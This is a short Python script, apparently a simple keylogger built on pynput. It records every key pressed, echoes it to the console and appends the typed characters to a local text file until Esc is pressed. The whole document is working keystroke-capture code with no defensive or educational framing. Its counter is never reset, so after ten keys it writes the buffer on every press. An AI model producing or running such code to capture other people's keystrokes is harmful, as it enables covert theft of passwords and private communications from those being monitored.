import pynput
from pynput.keyboard import Key, Listener

count= 0
keys = []


def on_press(key):
    global count, keys

    keys.append(key)
    count+=1
    print("{0}  pressed".format(key))

    #to store the val in key arr for each 10 words
    if count >= 10:
        write_file(keys)
        keys=[]


#writes the files to File.txt
def write_file(keys):
    with open("File.txt", "a") as f:
        for key in keys:
            k = str(key).replace(",", " ")
            if k.find("space") > 0:
               f.write('\n')
            elif k.find("key") == -1:
                f.write(k)



def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()


